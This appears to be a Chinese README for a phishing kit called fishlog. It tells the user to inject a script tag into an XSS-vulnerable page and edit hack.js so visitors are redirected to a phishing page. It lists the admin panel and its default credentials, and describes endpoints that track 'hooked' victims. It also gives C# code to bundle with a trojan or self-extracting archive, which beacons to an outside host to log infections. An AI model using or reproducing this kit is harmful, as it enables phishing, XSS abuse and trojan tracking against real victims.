## 使用方法 
在存在XSS的位置插入

```javascript
<script src="hack.js"></script>
```


js的引入位置为你服务器上的位置 



hack.js需要修改  

```
 60    window.location.href="https://www.baidu.com/";
```

60行的跳转地址为你搭建的钓鱼页面地址

------

登陆地址

```
http://127.0.0.1/fishlog/public/index.php/admins/account/login
```

初始账号:admin       初始密码: 123456        



数据库名称 : fishlog
账号 ： root

密码 ：root



------



访问情况接口 : 通过一系列数据，来简略判断是否已被识别出钓鱼

```
http://127.0.0.1/fishlog/public/index.php/admins/Index/index
```

注:程序只有搭建在服务器上  才能获取IP  在本地都会是127.0.0.1



上钩鱼儿接口 : 存在这里的IP不会再进行钓鱼操作

```
http://127.0.0.1/fishlog/public/index.php/admins/Index/onhook
```



将下述代码封装进马子，或者和马子捆绑，或者rar自解压即可

```c#
using System;
using System.Net;
using System.Threading;

namespace testHttp
{
    class Program
    {
        static void Main(string[] args)
        {
            ThreadStart childref = new ThreadStart(sendLog);
            Thread childThread = new Thread(childref);
            childThread.Start();
        }

        public static void sendLog()
        {
            string url = "http://hackerc.com/api.php?m=api&do=myLogk";
            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
            request.Method = "HEAD";
            request.Timeout = 100000;
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
        }
    }
}
```

参考:

https://www.moonsec.com/archives/2546
https://www.t00ls.net/viewthread.php?tid=57827&extra=&highlight=flash&page=1
https://www.t00ls.net/viewthread.php?tid=58890&highlight=flash


------

下版本....

1.加黑名单
6.状态栏目需要修改状态